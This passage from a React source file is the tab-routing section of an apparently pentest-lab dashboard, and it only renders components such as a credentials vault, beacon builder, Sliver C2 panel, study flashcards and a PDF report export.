          <button onClick={() => generateLabReport({ sessions, techniques, vms })} className={`${BTN_GHOST} w-full text-left text-[11px]`}> Exportar PDF</button>
        </div>
      </div>

      {/* Content */}
      <div className="p-3 sm:p-5 max-w-[1100px] mx-auto">
        {tab === "overview" && <Overview sessions={sessions} techniques={techniques} />}
        {tab === "sessions" && <Sessions sessions={sessions} setSessions={setSessions} techniques={techniques} />}
        {tab === "techniques" && <Techniques techniques={techniques} setTechniques={setTechniques} sessions={sessions} vms={vms} />}
        {tab === "timeline" && <TimelineView sessions={sessions} techniques={techniques} />}
        {tab === "vms" && <VmInventory vms={vms} setVms={setVms} sliver={sliver} onOpenC2={sessionId => { setC2Target(sessionId); setTab("c2"); }} />}
        {tab === "credentials" && <CredentialsVault credentials={credentials} setCredentials={setCredentials} vms={vms} sessions={sessions} />}
        {tab === "dorks" && <DorkPanel sessions={sessions} techniques={techniques} setTechniques={setTechniques} />}
        {tab === "mitre" && <MitreMap techniques={techniques} sessions={sessions} />}
        {tab === "beacon-lab" && <BeaconBuilder />}
        {tab === "writeup" && <WriteupGenerator sessions={sessions} techniques={techniques} vms={vms} />}
        {tab === "netmap" && <NetworkMap vms={vms} sliver={sliver} />}
        {tab === "virustotal" && <VirusTotalLookup />}
        {tab === "cyberscan" && <CyberScan sliver={sliver} vms={vms} sessions={sessions} techniques={techniques} setTechniques={setTechniques} />}
        {tab === "navigator" && <NavigatorExport techniques={techniques} />}
        {tab === "ioc" && <IocTracker sessions={sessions} />}
        {tab === "scoring" && <Scoring sessions={sessions} techniques={techniques} />}
        {tab === "flashcards" && <Flashcards techniques={techniques} />}
        {tab === "studycards" && <StudyCards />}
        {tab === "compare" && <SessionCompare sessions={sessions} techniques={techniques} />}
        {tab === "labcheck" && <LabCheck sliver={sliver} vms={vms} />}
        {tab === "scripts" && <ScriptArsenal />}
        {tab === "playbooks" && <PentestPlaybooks />}
        {tab === "netmon" && <NetworkMonitor sliver={sliver} />}
        {tab === "social" && <SocialEngineering sliver={sliver} />}
        {tab === "c2" && sliver.enabled && <SliverPanel sliver={sliver} sessions={sessions} techniques={techniques} setTechniques={setTechniques} initialTarget={c2Target} />}
      </div>
    </div>
  );
}
